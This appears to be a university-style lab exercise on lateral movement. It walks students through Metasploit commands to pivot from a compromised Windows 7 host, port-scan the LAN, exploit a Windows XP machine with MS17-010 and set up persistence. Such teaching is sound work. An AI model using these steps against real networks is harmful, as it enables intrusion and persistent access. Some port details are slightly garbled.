---
layout: editorial
---

# Lateral Movement

### Discussion

Lateral movement occurs when a threat actor gains access to one computer and then compromises other computers within an organization. It is a nightmare incident response process because every computer has to be analyzed to determine if it has been compromised. Imagine an organization with 100s or thousands of computers. Other security monitoring tools within the organization can help determine the scope of the attack. However, some organizations are so badly infected that they have to rebuild their entire network or certain parts of it.

### Lab preparation

1. Setup your Kali on the NETSEC-WAN.
2. Ensure your WIndows 7 and Windows XP hosts are up and running and both are on the LAN segment.
3. Make a note of your windows IP address.
4. Re-establish the reverse shell with the Windows 7 host.

### Starting the lab

On Kali, once you have the reverse shell set up, type:

**background**

and you’ll be back at the Metasploit main console.

### Running a port scan

In order to determine what other hosts are on the LAN, threat actors will perform a port scan and then start to target those systems. You’re going to use the port scanner in Metasploit. Load the tcp portscanning module..

**use auxiliary/scanner/portscan/tcp**

Run:

**show options**

Threads help speed up the scan by scanning multiple hosts at one time. This is dependent on the amount of RAM and CPU power of your Kali system. Too many threads will hose your Kali system.

**set threads 10**

Set the network of the compromised hosts. (Keep in mind that after enumerating the host, the threat actor may target other networks within the organization.)

**set RHOSTS 192.168.1.0/24**

Set some common ports to look for Linux (22, 80, 43) and Windows hosts (80, 137, 138, 138, 443 445):

**set PORTS 22,138,139,80,443, 445**

Run the command:

**sessions**

You will use the session with the victim computer to turn the compromised computer to a router. Effectively, it will allow you access to other hosts on the LAN via the already compromised Windows 7 hosts. In the screenshot below, I can use either of the established meterpreter sessions to create the route.

**e.g.**

![e.g.](https://i.imgur.com/uAs78jM.png)

Set the route with (Replace X with YOUR session ID):

**route add 192.168.1.0/24 X**

Then run:

**run**

Wait as the scan is performed. When the scan is finished,

1. Check for your Windows XP IP address.
2. Then run the MS17-010 exploit against it.
3. Setup persistence via the meterpreter session. Recall from your last assignment that you’re already using port 443 so choose a different port like 8443.
4. Create a listener and then manually reboot your windows XP session.

**Based on this lab, do you understand how it only takes one compromised host which can lead to a compromise of other hosts on a network?**
